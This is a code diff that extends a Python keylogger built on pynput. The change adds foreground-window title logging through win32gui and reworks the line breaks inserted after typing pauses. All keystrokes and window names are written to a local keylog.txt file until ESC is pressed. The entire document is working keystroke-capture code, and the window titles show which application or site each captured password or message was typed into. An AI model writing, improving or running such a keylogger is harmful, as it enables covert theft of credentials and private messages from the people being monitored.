@@ -1,26 +1,29 @@
 from pynput import keyboard
+import win32gui
 import time
-import threading
 
 # Specify the log file
 log_file = "keylog.txt"
 
 # Initialize variables
 last_key_time = time.time()  # Track the last time a key was pressed
-inactive_duration = 3  # Inactivity duration in seconds
-new_line_pending = False  # Flag to track if a new line should be added
+inactive_duration = 3  # 3 seconds of inactivity
+current_window = None  # Store the current window title
 
 # Function to log key presses
 def on_press(key):
-    global last_key_time, new_line_pending
-
-    # Check if a new line should be added due to inactivity
-    if new_line_pending:
-        log_key("\n")  # Move to the next line
-        new_line_pending = False  # Reset the flag
+    global last_key_time, current_window
 
     # Update the last key time on any key press
     last_key_time = time.time()
+
+    # Get the active window
+    new_window = get_active_window()
+
+    # Check if the window has changed
+    if new_window != current_window:
+        current_window = new_window
+        log_window_change(current_window)
 
     try:
         # Get the character representation of the key
@@ -43,32 +46,34 @@ def on_press(key):
                 log_key(f"[{key.name}] ")
 
     except AttributeError:
-        # Handle any attribute errors gracefully
         pass
 
+# Function to log the current window title
+def log_window_change(window_title):
+    with open(log_file, "a", encoding="utf-8") as f:  # Open file with UTF-8 encoding
+        f.write(f"\n\n=== {window_title} ===\n{'-' * len(window_title)}\n")
+
+# Function to log key presses
 def log_key(key_str):
+    global last_key_time
+    # Check for inactivity before logging
+    current_time = time.time()
+    if current_time - last_key_time > inactive_duration and key_str != "\n":
+        with open(log_file, "a", encoding="utf-8") as f:
+            f.write("\n")  # Move to the next line after inactivity
+
     # Log the key to the file
-    with open(log_file, "a") as f:
+    with open(log_file, "a", encoding="utf-8") as f:
         f.write(key_str)
+
+# Function to get the active window title (Windows only)
+def get_active_window():
+    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 # Function to handle key release
 def on_release(key):
     if key == keyboard.Key.esc:  # Press ESC to stop the keylogger
         return False
-
-# Background function to check for inactivity
-def check_inactivity():
-    global last_key_time, new_line_pending
-    while True:
-        current_time = time.time()
-        if current_time - last_key_time > inactive_duration:
-            new_line_pending = True  # Flag to add a new line when the next key is pressed
-        time.sleep(1)  # Check every second
-
-# Start the inactivity check in a separate thread
-inactivity_thread = threading.Thread(target=check_inactivity)
-inactivity_thread.daemon = True  # Make sure the thread exits when the main program does
-inactivity_thread.start()
 
 # Start the keylogger
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
